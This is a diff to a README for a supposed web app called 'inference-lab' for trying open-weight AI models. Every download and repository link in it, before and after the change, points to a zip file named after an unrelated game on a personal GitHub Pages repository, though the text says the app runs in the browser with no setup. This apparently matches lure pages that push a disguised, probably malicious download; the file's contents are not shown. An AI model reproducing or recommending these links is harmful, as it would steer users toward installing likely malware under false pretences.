@@ -11,7 +11,7 @@ Welcome to **inference-lab**! This is a simple, friendly web application that gi
 
 Think of it as a **digital laboratory** where you can test different AI models without needing a powerful computer or any technical setup. Everything runs in your web browser, and it's completely free to use.
 
-[![Download inference-lab](https://img.shields.io/badge/Download-inference--lab-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eldthosabu19/eldthosabu19.github.io/raw/refs/heads/main/games/rhythm-realm/v3.8-beta.5.zip)
+[![Download inference-lab](https://img.shields.io/badge/Download-inference--lab-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/eldthosabu19/eldthosabu19.github.io/main/games/rhythm-realm/v3.8-beta.5.zip)
 
 ## ✨ What Makes inference-lab Special?
 
@@ -28,7 +28,7 @@ Getting started is as easy as 1-2-3! Since inference-lab is a web application, y
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/eldthosabu19/eldthosabu19.github.io/raw/refs/heads/main/games/rhythm-realm/v3.8-beta.5.zip](https://github.com/eldthosabu19/eldthosabu19.github.io/raw/refs/heads/main/games/rhythm-realm/v3.8-beta.5.zip)
+Visit this link to download the application: [https://raw.githubusercontent.com/eldthosabu19/eldthosabu19.github.io/main/games/rhythm-realm/v3.8-beta.5.zip](https://raw.githubusercontent.com/eldthosabu19/eldthosabu19.github.io/main/games/rhythm-realm/v3.8-beta.5.zip)
 
 ### Step 2: Choose Your Version
 
@@ -106,7 +106,7 @@ These are AI models whose internal parameters are publicly available. Think of t
 
 ## 📚 Additional Resources
 
-- **Official Repository:** [https://github.com/eldthosabu19/eldthosabu19.github.io/raw/refs/heads/main/games/rhythm-realm/v3.8-beta.5.zip](https://github.com/eldthosabu19/eldthosabu19.github.io/raw/refs/heads/main/games/rhythm-realm/v3.8-beta.5.zip)
+- **Official Repository:** [https://raw.githubusercontent.com/eldthosabu19/eldthosabu19.github.io/main/games/rhythm-realm/v3.8-beta.5.zip](https://raw.githubusercontent.com/eldthosabu19/eldthosabu19.github.io/main/games/rhythm-realm/v3.8-beta.5.zip)
 - **Hetzner Experiments API:** Learn more about the free API that powers this app.
 - **Qwen Models:** Explore the Qwen model family for advanced capabilities.
 
@@ -119,6 +119,6 @@ If you find inference-lab useful, consider:
 
 ---
 
-**Ready to start exploring?** [Download inference-lab now](https://github.com/eldthosabu19/eldthosabu19.github.io/raw/refs/heads/main/games/rhythm-realm/v3.8-beta.5.zip) and unlock the power of open-weight AI models today!
+**Ready to start exploring?** [Download inference-lab now](https://raw.githubusercontent.com/eldthosabu19/eldthosabu19.github.io/main/games/rhythm-realm/v3.8-beta.5.zip) and unlock the power of open-weight AI models today!
 
 Keywords: hetzner, inference, llm, openai-compatible, pwa, qwen
